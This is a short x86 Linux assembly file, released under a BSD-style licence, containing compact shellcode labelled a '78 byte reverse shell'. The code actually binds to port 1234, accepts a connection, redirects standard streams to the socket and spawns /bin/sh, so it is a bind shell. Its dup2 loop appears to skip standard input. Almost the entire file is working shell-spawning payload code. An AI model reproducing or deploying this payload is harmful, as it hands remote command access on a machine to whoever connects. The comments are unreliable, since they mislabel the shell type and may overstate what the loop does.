;
;  Copyright © 2017 Odzhan. All Rights Reserved.
;
;  Redistribution and use in source and binary forms, with or without
;  modification, are permitted provided that the following conditions are
;  met:
;
;  1. Redistributions of source code must retain the above copyright
;  notice, this list of conditions and the following disclaimer.
;
;  2. Redistributions in binary form must reproduce the above copyright
;  notice, this list of conditions and the following disclaimer in the
;  documentation and/or other materials provided with the distribution.
;
;  3. The name of the author may not be used to endorse or promote products
;  derived from this software without specific prior written permission.
;
;  THIS SOFTWARE IS PROVIDED BY AUTHORS "AS IS" AND ANY EXPRESS OR
;  IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
;  WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
;  DISCLAIMED. IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT,
;  INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES
;  (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
;  SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
;  HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT,
;  STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN
;  ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
;  POSSIBILITY OF SUCH DAMAGE.
;    

; 78 byte reverse shell for Linux/x86
; odzhan

    %include "include.inc"

    %define PORT 1234
    
    xor    ebx, ebx
    mul    ebx
    ; step 1, create a socket
    ; socket (AF_INET, SOCK_STREAM, IPPROTO_IP)
    inc    ebx               ; ebx      = SYS_SOCKET
    mov    al, SYS_socketcall
    push   edx               ; protocol = IPPROTO_IP
    push   ebx               ; type     = SOCK_STREAM
    push   AF_INET
    mov    ecx, esp          ; ecx      = &args
    int    0x80

    xchg   eax, edi
    
    ; step 2, bind to port 1234
    ; bind (s, &sa, sizeof(sa))
    pop    ebx               ; ebx = SYS_BIND
    pop    esi               ; esi = 1
    push   ((htons(PORT) << 16) | AF_INET) & 0xFFFFFFFF
    mov    ecx, esp
    push   SYS_socketcall
    pop    eax
    push   eax               ; sizeof(sa)    
    push   ecx               ; &sa
    push   edi               ; s
    mov    ecx, esp          ; ecx=&args
    int    0x80
    
    mov    [ecx+4], edx      ; clear sa from args
    
    ; step 3, listen for incoming connections
    ; listen (s, 0);
    mov    al, SYS_socketcall
    mov    bl, SYS_LISTEN
    int    0x80
    
    ; step 4, accept connections
    ; accept (s, 0, 0);
    mov    al, SYS_socketcall
    inc    ebx               ; ebx=sys_accept
    int    0x80
    
    ; step 5, assign socket to stdin, stdout and stderr
    ; dup2(s, STDIN_FILENO); 
    ; dup2(s, STDOUT_FILENO); 
    ; dup2(s, STDERR_FILENO); 
    push   STDERR_FILENO
    pop    ecx               ; ecx=2
    xchg   ebx, eax          ; ebx=s
c_dup:
    push   SYS_dup2
    pop    eax
    int    0x80
    dec    ecx
    jnz    c_dup
    
    ; step 6, execute /bin//sh
    mov    al, SYS_execve
    push   ecx
    push   '//sh'            ; 
    push   '/bin'            ; 
    mov    ebx, esp          ; ebx="/bin//sh", 0
    int    0x80              ; exec sys_execve
